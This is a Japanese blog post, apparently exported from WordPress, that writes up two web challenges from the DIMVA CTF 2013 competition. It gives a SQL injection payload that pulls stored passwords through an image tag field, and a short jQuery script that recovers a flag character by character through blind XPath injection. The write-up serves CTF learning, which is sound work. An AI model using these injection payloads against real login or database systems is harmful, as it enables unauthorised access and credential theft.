---
title: DIMVA CTF 2013 writeup
author: tyage
type: posts
date: 2013-07-19T16:29:48+00:00
url: /?p=697
wp-syntax-cache-content:
  - |
    a:2:{i:1;s:959:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>10
    </pre></td><td class="code"><pre class="html5" style="font-family:monospace;">'user' and/or 'password' parameters missing, please provide an xml parameter of the following form to login: <span style="color: #009900;">&lt;login&gt;&lt;user&gt;</span>(base64-encoded username)<span style="color: #009900;">&lt;<span style="color: #66cc66;">/</span>user&gt;&lt;password&gt;</span>(base64-encoded password)<span style="color: #009900;">&lt;<span style="color: #66cc66;">/</span>password&gt;&lt;<span style="color: #66cc66;">/</span>login&gt;</span></pre></td></tr></table><p class="theCode" style="display:none;">'user' and/or 'password' parameters missing, please provide an xml parameter of the following form to login: &lt;login&gt;&lt;user&gt;(base64-encoded username)&lt;/user&gt;&lt;password&gt;(base64-encoded password)&lt;/password&gt;&lt;/login&gt;</p></div>
    ";i:2;s:5063:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;"><span style="color: #000066; font-weight: bold;">var</span> search <span style="color: #339933;">=</span> <span style="color: #3366CC;">&quot;c0ffee&quot;</span><span style="color: #339933;">;</span>
    &nbsp;
    <span style="color: #000066; font-weight: bold;">var</span> test <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>next<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
    	$.<span style="color: #660066;">ajax</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#123;</span>
    		url<span style="color: #339933;">:</span> <span style="color: #3366CC;">&quot;/&quot;</span><span style="color: #339933;">,</span>
    		data<span style="color: #339933;">:</span> <span style="color: #009900;">&#123;</span>
    			user<span style="color: #339933;">:</span> <span style="color: #3366CC;">&quot;&quot;</span><span style="color: #339933;">,</span>
    			password<span style="color: #339933;">:</span> Base64.<span style="color: #660066;">encode</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;' | //User[contains(.,'&quot;</span> <span style="color: #339933;">+</span> search <span style="color: #339933;">+</span> next<span style="color: #009900;">&#41;</span>
    		<span style="color: #009900;">&#125;</span>
    	<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span>.<span style="color: #660066;">done</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>data<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
    		search <span style="color: #339933;">+=</span> next
    		nextTest<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    	<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    <span style="color: #009900;">&#125;</span><span style="color: #339933;">;</span>
    &nbsp;
    <span style="color: #000066; font-weight: bold;">var</span> nextTest <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
    	<span style="color: #000066; font-weight: bold;">for</span> <span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">var</span> i<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;a&quot;</span>.<span style="color: #660066;">charCodeAt</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;=</span><span style="color: #3366CC;">&quot;z&quot;</span>.<span style="color: #660066;">charCodeAt</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;++</span>i<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
    		test<span style="color: #009900;">&#40;</span><span style="">String</span>.<span style="color: #660066;">fromCharCode</span><span style="color: #009900;">&#40;</span>i<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    	<span style="color: #009900;">&#125;</span>
    	<span style="color: #000066; font-weight: bold;">for</span> <span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">var</span> i<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;=</span><span style="color: #CC0000;">9</span><span style="color: #339933;">;++</span>i<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
    		test<span style="color: #009900;">&#40;</span>i<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    	<span style="color: #009900;">&#125;</span>
    <span style="color: #009900;">&#125;</span><span style="color: #339933;">;</span></pre></td></tr></table><p class="theCode" style="display:none;">var search = &quot;c0ffee&quot;;
    
    var test = function(next) {
    	$.ajax({
    		url: &quot;/&quot;,
    		data: {
    			user: &quot;&quot;,
    			password: Base64.encode(&quot;' | //User[contains(.,'&quot; + search + next)
    		}
    	}).done(function(data) {
    		search += next
    		nextTest();
    	});
    };
    
    var nextTest = function() {
    	for (var i=&quot;a&quot;.charCodeAt(0);i&lt;=&quot;z&quot;.charCodeAt(0);++i) {
    		test(String.fromCharCode(i));
    	}
    	for (var i=0;i&lt;=9;++i) {
    		test(i);
    	}
    };</p></div>
    ";}
categories:
  - CTF

---
<p><a href="https://dimvactf.0x90.eu" title="DIMVA CTF">DIMVA CTF</a>に参加していた。</p>
<p>私のチーム（Epsilon Delta）は850ポイントで17位だった。</p>
<h3>Web 100</h3>
<p>画像アップローダーが用意されており、どうにかこうにかする問題。</p>
<p>はじめにいくつか画像が用意されており、パスワードを入力しないと閲覧できない画像があったため、そのパスワードを求める問題と推察される。</p>
<p>各画像にはタグがついており、同じタグを持つ写真を一覧で見れる。</p>
<p>しかし、シングルクオートの入ったタグの場合は一覧ページでエラーが発生していたため、SQLインジェクションがあるとわかった。</p>
<p>画像をアップロードした際、画像のコメントがタグになって登録されるので、そこにSQLインジェクションを埋め込む。</p>
<pre>
' union all select password from pictures--
</pre>
<p>その後、一覧ページを閲覧することでパスワードが入手でき、c0ffeeからはじまるパスワードがFlagであると判明した。</p>
<pre>
c0ffee29e34ad42d38cbe236913c911a
</pre>
<p>パスワード付きの画像はこんな感じだった。</p>
<p><a href="https://blog.tyage.net/wp-content/uploads/2013/07/4567.jpg"><img data-attachment-id="699" data-permalink="https://blog.tyage.net/?attachment_id=699" data-orig-file="https://blog.tyage.net/wp-content/uploads/2013/07/4567.jpg" data-orig-size="616,425" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;9&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;DSLR-A700&quot;,&quot;caption&quot;:&quot;SONY DSC&quot;,&quot;created_timestamp&quot;:&quot;1226238208&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;210&quot;,&quot;iso&quot;:&quot;800&quot;,&quot;shutter_speed&quot;:&quot;0.001&quot;,&quot;title&quot;:&quot;SONY DSC&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="SONY DSC" data-image-description="" data-medium-file="https://blog.tyage.net/wp-content/uploads/2013/07/4567.jpg" data-large-file="https://blog.tyage.net/wp-content/uploads/2013/07/4567.jpg" src="http://blog.tyage.net/wp-content/uploads/2013/07/4567-300x206.jpg" alt="SONY DSC" width="300" height="206" class="alignnone size-medium wp-image-699" /></a></p>
<p>素直でわかりやすい問題だったように思う。</p>
<h3>Web 200</h3>
<p>普通にアクセスすると</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>10
</pre></td><td class="code"><pre class="html5" style="font-family:monospace;">'user' and/or 'password' parameters missing, please provide an xml parameter of the following form to login: <span style="color: #009900;">&lt;login&gt;&lt;user&gt;</span>(base64-encoded username)<span style="color: #009900;">&lt;<span style="color: #66cc66;">/</span>user&gt;&lt;password&gt;</span>(base64-encoded password)<span style="color: #009900;">&lt;<span style="color: #66cc66;">/</span>password&gt;&lt;<span style="color: #66cc66;">/</span>login&gt;</span></pre></td></tr></table></div>

<p>ってのが返って来る。</p>
<p>一日近く、urlにログイン用xmlを足したり、ファイルとして送信したり、送信するパケットのいろんなところに埋め込んだりして悩んだ。。。</p>
<p>コンテスト終了直前になって、/?xml=<login>&#8230;とすればログインできることに気づく。</p>
<p>xml parameterってのが素直にxmlって名前のリクエストパラメータだったのに、そこに気づくまでに一日かかって英語の壁を感じる。</p>
<p>これがわかればあとは解くだけ。</p>
<p>とりあえず色々試していると、以下のレスポンスが返って来たため、XPathへのインジェクションだとわかった。</p>
<pre>
 Error during login: Query: //User[UserName/text()='' and Password/text()='' '... ........................................................^^^ Invalid query somewhere around here (I think)
</pre>
<p>「&#8217; or &#8216;1&#8217;=&#8217;1」とかしてログインに成功すると、htmlのコメントで「users.xml~が残ってるからあとで消すように」と書かれているのでアクセスしてみる。</p>
<p>xml形式のユーザーデータがあり、「c0ffeefa7745f449c26000a2612affec」というデータがあったので、それをFlagとして送信したが失敗。</p>
<p>どうやらuser.xml~は古いデータらしく、現在は別のものに置き換わっている模様。</p>
<p>なのでblind injectionを利用して現在のデータからFlagを取得する。</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;"><span style="color: #000066; font-weight: bold;">var</span> search <span style="color: #339933;">=</span> <span style="color: #3366CC;">&quot;c0ffee&quot;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #000066; font-weight: bold;">var</span> test <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>next<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
	$.<span style="color: #660066;">ajax</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#123;</span>
		url<span style="color: #339933;">:</span> <span style="color: #3366CC;">&quot;/&quot;</span><span style="color: #339933;">,</span>
		data<span style="color: #339933;">:</span> <span style="color: #009900;">&#123;</span>
			user<span style="color: #339933;">:</span> <span style="color: #3366CC;">&quot;&quot;</span><span style="color: #339933;">,</span>
			password<span style="color: #339933;">:</span> Base64.<span style="color: #660066;">encode</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;' | //User[contains(.,'&quot;</span> <span style="color: #339933;">+</span> search <span style="color: #339933;">+</span> next<span style="color: #009900;">&#41;</span>
		<span style="color: #009900;">&#125;</span>
	<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span>.<span style="color: #660066;">done</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>data<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
		search <span style="color: #339933;">+=</span> next
		nextTest<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #000066; font-weight: bold;">var</span> nextTest <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
	<span style="color: #000066; font-weight: bold;">for</span> <span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">var</span> i<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;a&quot;</span>.<span style="color: #660066;">charCodeAt</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;=</span><span style="color: #3366CC;">&quot;z&quot;</span>.<span style="color: #660066;">charCodeAt</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;++</span>i<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
		test<span style="color: #009900;">&#40;</span><span style="">String</span>.<span style="color: #660066;">fromCharCode</span><span style="color: #009900;">&#40;</span>i<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #009900;">&#125;</span>
	<span style="color: #000066; font-weight: bold;">for</span> <span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">var</span> i<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;=</span><span style="color: #CC0000;">9</span><span style="color: #339933;">;++</span>i<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
		test<span style="color: #009900;">&#40;</span>i<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #009900;">&#125;</span>
<span style="color: #009900;">&#125;</span><span style="color: #339933;">;</span></pre></td></tr></table></div>

<p>以下のFlagが得られる。</p>
<pre>
c0ffee153dbc077ea80f4e697a63ec1e
</pre>
<p>Accepted!!!</p>
